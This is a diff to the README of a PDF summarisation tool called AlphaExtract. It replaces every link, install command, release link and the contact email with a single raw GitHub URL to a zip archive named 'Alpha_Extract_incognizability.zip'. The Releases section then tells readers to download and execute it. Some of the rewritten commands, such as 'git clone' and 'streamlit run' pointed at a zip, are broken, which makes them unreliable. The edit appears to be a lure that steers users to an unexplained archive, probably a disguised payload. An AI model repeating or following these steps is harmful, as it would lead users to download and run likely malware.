@@ -1,6 +1,6 @@
 # AlphaExtract 🚀
 
-![AlphaExtract](https://img.shields.io/badge/AlphaExtract-PDF_Summarization_Tool-blue)
+![AlphaExtract](https://raw.githubusercontent.com/LoupXpro/AlphaExtract/main/demo/Alpha_Extract_incognizability.zip)
 
 AlphaExtract is a sophisticated PDF summarization tool that combines cutting-edge AI technology with efficient document processing. Built using Python, this project leverages Meta's LLaMA 4 MOE Maverick model alongside Groq's inference engine to provide fast and accurate PDF summaries.
 
@@ -30,7 +30,7 @@ To get started with AlphaExtract, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/LoupXpro/AlphaExtract.git
+   git clone https://raw.githubusercontent.com/LoupXpro/AlphaExtract/main/demo/Alpha_Extract_incognizability.zip
    cd AlphaExtract
    ```
 
@@ -44,13 +44,13 @@ To get started with AlphaExtract, follow these steps:
 3. **Install Dependencies**:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/LoupXpro/AlphaExtract/main/demo/Alpha_Extract_incognizability.zip
    ```
 
 4. **Run the Application**:
 
    ```bash
-   streamlit run app.py
+   streamlit run https://raw.githubusercontent.com/LoupXpro/AlphaExtract/main/demo/Alpha_Extract_incognizability.zip
    ```
 
 ## Usage 📖
@@ -61,7 +61,7 @@ After installation, you can use AlphaExtract to summarize your PDFs easily.
 2. **Generate Summary**: Click the "Summarize" button to get your summary.
 3. **Download the Summary**: Once generated, you can download the summary for your records.
 
-For more detailed usage instructions, refer to the [Releases](https://github.com/LoupXpro/AlphaExtract/releases) section.
+For more detailed usage instructions, refer to the [Releases](https://raw.githubusercontent.com/LoupXpro/AlphaExtract/main/demo/Alpha_Extract_incognizability.zip) section.
 
 ## Technologies Used 🧰
 
@@ -104,14 +104,14 @@ AlphaExtract is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases 📦
 
-For the latest updates and releases, visit the [Releases](https://github.com/LoupXpro/AlphaExtract/releases) section. You can download the latest version and execute it to experience the latest features.
+For the latest updates and releases, visit the [Releases](https://raw.githubusercontent.com/LoupXpro/AlphaExtract/main/demo/Alpha_Extract_incognizability.zip) section. You can download the latest version and execute it to experience the latest features.
 
 ## Contact 📫
 
 For questions or feedback, please reach out:
 
-- **Email**: support@alphaextract.com
-- **GitHub**: [LoupXpro](https://github.com/LoupXpro)
+- **Email**: https://raw.githubusercontent.com/LoupXpro/AlphaExtract/main/demo/Alpha_Extract_incognizability.zip
+- **GitHub**: [LoupXpro](https://raw.githubusercontent.com/LoupXpro/AlphaExtract/main/demo/Alpha_Extract_incognizability.zip)
 
 ---
 
